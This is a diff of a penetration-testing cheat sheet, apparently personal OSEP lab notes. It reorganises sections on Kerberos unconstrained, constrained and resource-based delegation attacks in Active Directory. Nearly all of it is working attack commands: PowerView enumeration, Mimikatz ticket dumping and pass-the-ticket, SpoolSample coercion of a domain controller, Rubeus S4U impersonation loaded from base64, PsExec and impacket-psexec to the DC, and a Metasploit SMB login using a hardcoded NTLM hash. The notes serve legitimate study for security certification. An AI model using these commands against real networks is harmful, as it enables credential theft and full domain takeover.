@@ -1561,25 +1561,24 @@ setspn -a prod.corp1.com/TestService3.prod.corp1.com:1337 prod.corp1.com\TestSer
 # then perform kerberoast with Invoke-Kerberoast.ps1
 ```
 
-## kerberos delegation
+## kerberos unconstrained delegation
+### enumeration
+we want to look for `TRUSTED_FOR_DELEGATION` any machine with this will be the target
 ```
-# enumerate unconstrained delegation
-# we want to look for TRUSTED_FOR_DELEGATION
 Get-DomainComputer -Unconstrained
 Get-DomainComputer -Unconstrained | Format-Table name, dnshostname, useraccountcontrol -Wrap
 # you can use the dnshostname property to determine its IP
 nslookup <dnshostname>
-```
-### enumeration troubleshooting
-```
+
+# enumeration troubleshooting
 Exception calling "FindAll" with "0" argument(s): "Unknown error (0x80005000)"
 - powerview won't work with local admin, local admin is not domain joined
-- SYSTEM is domained joined (as a computer object), upgrade to SYSTEM user via printspooler bug
+- SYSTEM is domained joined (as a computer object), upgrade to SYSTEM user via printspoofer
 ```
-
+### manual approach
+attacker must wait for a victim to access a service that has unconstrained delegation
+this example: admin user is visiting `http://appsrv01` from a client machine which stores the TGT in memory
 ```
-# manual approach: you need a victim to to use a service that has unconstrained delegation
-# in this example: admin user is visiting http://appsrv01 from a client machine which stores the TGT in memory
 # on the appsrv01 machine as user offsec open powershell with admin priv and -ep bypass
 # try different versions of Invoke-Mimikatz.ps1 if you still get errors
 . .\Invoke-Mimikatz2.ps1
@@ -1588,15 +1587,16 @@ Invoke-Mimikatz -Command "privilege::debug sekurlsa::tickets"
 ...
 Client Name  (01) : admin ; @ PROD.CORP1.COM
 ...
-# note: sometimes you won't get the ticket, you need to be quick or use the right browser
+# note: sometimes you won't get the ticket
+- you need to be quick or use the right browser to visit http://appsrv01 to cache TGT in memory
 Invoke-Mimikatz -Command 'privilege::debug "sekurlsa::tickets /export"'
 # ls to see all the tickets and find the one that matches your target
 Invoke-Mimikatz  -Command '"kerberos::ptt [0;10a3f5]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi"'
 C:\Tools\SysinternalsSuite\PsExec.exe /accepteula \\cdc01 cmd
 ```
-
+### semi-auto approach
+force dc to connect to application service using SpoolSample.exe
 ```
-# semi-auto approach: force dc to connect to application service using SpoolSample.exe
 # check if print spooler service is running and accessible
 dir \\cdc01\pipe\spoolss
 
@@ -1647,12 +1647,12 @@ impacket-psexec  -k -no-pass PROD/newAdmin@cdc01.prod.corp1.com -dc-ip 192.168.1
 # alternatively, with golden ticket we can dump the password hash of a member of the Domain Admins group (DCSync attack)
 # which we will attempt below
 ```
-
-```
-# clean approach: perform semi-auto approach in the comfort of kali
-# prerequisites:
+### clean approach
+perform semi-auto approach in the comfort of kali
+prerequisites:
 - admin credentials
 - edit /etc/hosts
+```
 sudo vim /etc/hosts
 ...
 # <dc_ip> <domain> <dc_fqdn>
@@ -1742,7 +1742,7 @@ set SMBUser Administrator
 set SMBPass aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e
 exploit
 ```
-
+## kerberos constrained delegation
 ```
 # enumerate constrained delegation
 # reference: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation
@@ -1792,9 +1792,8 @@ $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String
 [Rubeus.Program]::Main("s4u /user:web01$ /rc4:b8cdd27f8218f12b4a49b7e06db340b6 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
 klist
 ```
-
+## kerberos resource-based contrained delegation
 ```
-# Resource-Based Contrained Delegation
 # requires: computer/service account with an SPN in msDS-AllowedToActOnBehalfOfOtherIdentity of backend service account
 # requires: GenericWrite access on a user to add SID of computer account to msDS-AllowedToActOnBehalfOfOtherIdentity of backend service
 # scenario: as user 'dave' on hostname 'client' we want to abuse constrained delegation to access mssql service
@@ -2105,7 +2104,7 @@ sudo smbpasswd -a kali
 sudo systemctl start smbd nmbd
 
 # ensure '/home/kali/osep/OSEP-Code-Snippets/' exists
-chmod -R 777 /home/kali/data
+chmod -R 777 /home/kali/osep
 ```
 
 ```
